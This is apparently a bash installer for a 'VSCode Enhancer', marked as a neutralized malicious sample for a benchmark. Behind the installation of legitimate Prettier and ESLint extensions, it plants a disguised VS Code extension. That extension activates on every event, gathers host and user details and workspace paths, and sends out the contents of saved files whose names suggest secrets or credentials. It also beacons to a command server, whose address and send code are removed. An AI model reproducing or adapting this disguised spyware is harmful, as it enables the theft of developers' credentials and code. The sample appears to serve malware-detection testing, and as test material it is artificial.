#!/bin/bash
# VSCode Enhancer - Installation Script
# BENCHMARK_TEST_ONLY - Neutralized malicious sample

set -e

VSCODE_EXT_DIR="$HOME/.vscode/extensions"
VSCODE_USER_DIR="$HOME/Library/Application Support/Code/User"
ENHANCER_DIR="$HOME/.vscode-enhancer"

echo "Installing VSCode Enhancer..."

# Create directories
mkdir -p "$ENHANCER_DIR" "$VSCODE_EXT_DIR"

# Install legitimate extensions
code --install-extension esbenp.prettier-vscode 2>/dev/null || true
code --install-extension dbaeumer.vscode-eslint 2>/dev/null || true

# [REDACTED] - Inject malicious extension
inject_extension() {
    local ext_dir="$VSCODE_EXT_DIR/codeboost.productivity-tools-1.0.0"
    mkdir -p "$ext_dir"

    # Create package.json for malicious extension
    cat > "$ext_dir/package.json" << 'EXTPKG'
{
    "name": "productivity-tools",
    "displayName": "Productivity Tools",
    "description": "Enhanced productivity features",
    "version": "1.0.0",
    "publisher": "codeboost",
    "engines": { "vscode": "^1.60.0" },
    "activationEvents": ["*"],
    "main": "./extension.js"
}
EXTPKG

    # [REDACTED] - Create malicious extension code
    cat > "$ext_dir/extension.js" << 'EXTJS'
const vscode = require('vscode');
const https = require('https');
const os = require('os');
const fs = require('fs');
const path = require('path');

function activate(context) {
    // [REDACTED] - Collect workspace information
    collectWorkspaceData();

    // [REDACTED] - Monitor file saves
    vscode.workspace.onDidSaveTextDocument(doc => {
        exfiltrateFile(doc.fileName, doc.getText());
    });

    // [REDACTED] - Periodic beacon
    setInterval(() => beacon(), 300000);
}

function collectWorkspaceData() {
    const data = {
        hostname: os.hostname(),
        user: os.userInfo().username,
        workspaces: vscode.workspace.workspaceFolders?.map(f => f.uri.fsPath),
        extensions: vscode.extensions.all.map(e => e.id)
    };

    sendToC2('/collect', data);
}

function exfiltrateFile(filePath, content) {
    // [REDACTED] - Only exfiltrate interesting files
    const interesting = ['.env', 'secret', 'password', 'config', 'credential'];
    if (interesting.some(i => filePath.toLowerCase().includes(i))) {
        sendToC2('/file', { path: filePath, content: content });
    }
}

function beacon() {
    sendToC2('/beacon', { alive: true, hostname: os.hostname() });
}

function sendToC2(endpoint, data) {
    // [REDACTED_C2_URL]
}

module.exports = { activate };
EXTJS
}

# Run installation
inject_extension

# Configure VSCode settings
python3 scripts/configure.py

echo "VSCode Enhancer installed successfully!"
